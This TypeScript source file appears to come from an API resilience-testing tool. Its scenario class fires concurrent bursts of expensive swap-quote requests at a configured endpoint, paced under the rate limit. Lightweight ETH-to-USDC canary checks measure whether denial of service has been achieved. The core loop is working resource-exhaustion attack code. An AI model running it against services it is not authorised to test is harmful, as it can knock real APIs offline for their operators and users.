import axios from "axios";
import chalk from "chalk";
import cliProgress from "cli-progress";
import endpoints from "../../config/endpoints.json";
import limits from "../../config/limits.json";
import exploitConfig from "../../config/exploit-payload.json";
import { RequestRunner, RequestMetric } from "../core/RequestRunner";
import { TestParams } from "../types";

interface HealthCheckResult {
	latency: number;
	status: number;
	healthy: boolean;
	timestamp: number;
}

interface ExploitResult {
	dosAchieved: boolean;
	totalRequests: number;
	successfulRequests: number;
	failedRequests: number;
	healthChecks: HealthCheckResult[];
	avgExploitLatency: number;
	degradationDetected: boolean;
	peakLatency: number;
}

export class ExploitVerifyScenario {
	private runner = new RequestRunner();
	private healthChecks: HealthCheckResult[] = [];
	private exploitMetrics: RequestMetric[] = [];
	private baselineMs: number = 0;
	private dynamicPayload: TestParams | null = null;

	// Calculate safe request interval to stay under rate limit
	private get safeRequestsPerSecond(): number {
		const { requestsPerMinute, safeMargin } = exploitConfig.rateLimit;
		return (requestsPerMinute * safeMargin) / 60;
	}

	private get intervalMs(): number {
		return Math.ceil(1000 / this.safeRequestsPerSecond);
	}

	async run(
		baselineMs: number,
		dynamicPayload?: TestParams,
	): Promise<ExploitResult> {
		this.baselineMs = baselineMs;
		this.dynamicPayload = dynamicPayload || null;

		// Determine which payload to use
		const payload =
			this.dynamicPayload ||
			(exploitConfig.payloads[0].params as TestParams);
		const payloadName = this.dynamicPayload
			? "Fuzz-Discovered"
			: exploitConfig.payloads[0].name;

		console.log(chalk.bold("\nRunning Exploit Verification Test..."));
		console.log(
			chalk.yellow(
				"  WARNING: This test attempts to exhaust server resources",
			),
		);
		console.log(
			`  - Rate Limit: ${exploitConfig.rateLimit.requestsPerMinute} req/min`,
		);
		console.log(
			`  - Safe Rate: ${(this.safeRequestsPerSecond * 60).toFixed(0)} req/min`,
		);
		console.log(`  - Concurrency: ${exploitConfig.test.concurrency}`);
		console.log(`  - Duration: ${exploitConfig.test.durationSeconds}s`);
		console.log(`  - Using Payload: "${payloadName}"\n`);

		const startTime = Date.now();
		const endTime = startTime + exploitConfig.test.durationSeconds * 1000;

		let requestCount = 0;
		let successCount = 0;
		let failCount = 0;

		// Initial health check
		await this.performHealthCheck();

		// Progress bar setup
		const bar = new cliProgress.SingleBar(
			{
				format:
					"Progress |" +
					chalk.cyan("{bar}") +
					"| {percentage}% || Elapsed: {duration}s || Requests: {requests} | Fails: {fails}",
				barCompleteChar: "\u2588",
				barIncompleteChar: "\u2591",
				hideCursor: true,
			},
			cliProgress.Presets.shades_classic,
		);

		bar.start(exploitConfig.test.durationSeconds, 0, {
			requests: 0,
			fails: 0,
		});

		// Main attack loop
		while (Date.now() < endTime) {
			// Send concurrent burst of expensive requests
			const burst = Array(exploitConfig.test.concurrency).fill(payload);
			const results = await this.runner.runBatch(
				endpoints.base,
				endpoints.method,
				burst,
			);

			this.exploitMetrics.push(...results);
			requestCount += results.length;
			successCount += results.filter(
				(r) => r.status >= 200 && r.status < 400,
			).length;
			failCount += results.filter(
				(r) => r.status >= 400 || r.status === 0,
			).length;

			// Update progress bar
			const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
			bar.update(elapsedSeconds, {
				requests: requestCount,
				fails: failCount,
			});

			// Periodic health check
			if (
				Date.now() -
					this.healthChecks[this.healthChecks.length - 1]?.timestamp >
				exploitConfig.test.healthCheckIntervalMs
			) {
				console.log(""); // New line before health check
				await this.performHealthCheck();
			}

			await this.sleep(this.intervalMs);
		}

		bar.stop();
		console.log("");

		// Final health check
		await this.performHealthCheck();

		return this.analyzeResults(requestCount, successCount, failCount);
	}

	private async performHealthCheck(): Promise<void> {
		// Use a lightweight canary request (small amount, direct=true, simple token pair)
		const canaryParams = {
			amount: "1000000000000000", // 0.001 ETH - small amount for fast response
			slippage: 1,
			direct: "true",
			excludeProtocols: "",
			tokenInAddress: "0x0000000000000000000000000000000000000000", // ETH
			tokenOutAddress: "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", // USDC
		};

		const start = performance.now();
		try {
			const response = await axios({
				url: endpoints.base,
				method: endpoints.method,
				params: canaryParams,
				timeout: limits.globalTimeoutMs,
				validateStatus: () => true,
			});

			const latency = performance.now() - start;
			const healthy = response.status >= 200 && response.status < 400;

			const result: HealthCheckResult = {
				latency,
				status: response.status,
				healthy,
				timestamp: Date.now(),
			};

			this.healthChecks.push(result);

			const degraded = latency > this.baselineMs * 3;
			const status = healthy ? (degraded ? "DEGRADED" : "OK") : "FAILED";
			console.log(`  Health Check: ${latency.toFixed(0)}ms (${status})`);
		} catch {
			const latency = performance.now() - start;
			const result: HealthCheckResult = {
				latency,
				status: 0,
				healthy: false,
				timestamp: Date.now(),
			};
			this.healthChecks.push(result);
			console.log(chalk.red(`  Health Check: FAILED (timeout/error)`));
		}
	}

	private analyzeResults(
		totalRequests: number,
		successfulRequests: number,
		failedRequests: number,
	): ExploitResult {
		const avgExploitLatency =
			this.exploitMetrics.reduce((sum, m) => sum + m.duration, 0) /
			this.exploitMetrics.length;

		const peakLatency = Math.max(
			...this.exploitMetrics.map((m) => m.duration),
		);

		// Degradation = any health check showed 3x baseline latency or failed
		const degradationDetected = this.healthChecks.some(
			(h) => !h.healthy || h.latency > this.baselineMs * 3,
		);

		// DoS achieved = majority of health checks failed OR showed severe degradation
		const failedHealthChecks = this.healthChecks.filter((h) => !h.healthy);
		const severelyDegraded = this.healthChecks.filter(
			(h) => h.latency > this.baselineMs * 5,
		);
		const dosAchieved =
			failedHealthChecks.length > this.healthChecks.length / 2 ||
			severelyDegraded.length > this.healthChecks.length / 2;

		// Report
		console.log(chalk.bold("\n  Exploit Verification Report"));
		console.log(
			chalk.dim("  ============================================"),
		);

		console.log(chalk.gray("\n  [ Attack Summary ]"));
		console.log(`  Total Requests     : ${totalRequests}`);
		console.log(`  Successful         : ${successfulRequests}`);
		console.log(`  Failed             : ${failedRequests}`);
		console.log(`  Avg Exploit Latency: ${avgExploitLatency.toFixed(2)}ms`);
		console.log(`  Peak Latency       : ${peakLatency.toFixed(2)}ms`);

		console.log(chalk.gray("\n  [ Health Assessment ]"));
		console.log(`  Health Checks      : ${this.healthChecks.length}`);
		console.log(`  Failed Checks      : ${failedHealthChecks.length}`);
		console.log(`  Degradation Events : ${severelyDegraded.length}`);

		console.log(chalk.gray("\n  [ Conclusion ]"));
		if (dosAchieved) {
			console.log(
				"  " +
					chalk.red.bold("FAIL") +
					": DoS Achieved - API became unresponsive",
			);
			console.log(
				chalk.red(
					"  • Vulnerability CONFIRMED. Immediate remediation required.",
				),
			);
		} else if (degradationDetected) {
			console.log(
				"  " +
					chalk.yellow.bold("WARNING") +
					": Partial Degradation - API slowed significantly",
			);
			console.log(
				chalk.yellow(
					"  • Vulnerability LIKELY. Extended attack may achieve DoS.",
				),
			);
		} else {
			console.log(
				"  " +
					chalk.green.bold("PASS") +
					": API Resilient - No degradation detected",
			);
			console.log(
				chalk.green(
					"  • API handled expensive payloads within limits.",
				),
			);
		}

		return {
			dosAchieved,
			totalRequests,
			successfulRequests,
			failedRequests,
			healthChecks: this.healthChecks,
			avgExploitLatency,
			degradationDetected,
			peakLatency,
		};
	}

	private sleep(ms: number): Promise<void> {
		return new Promise((resolve) => setTimeout(resolve, ms));
	}
}
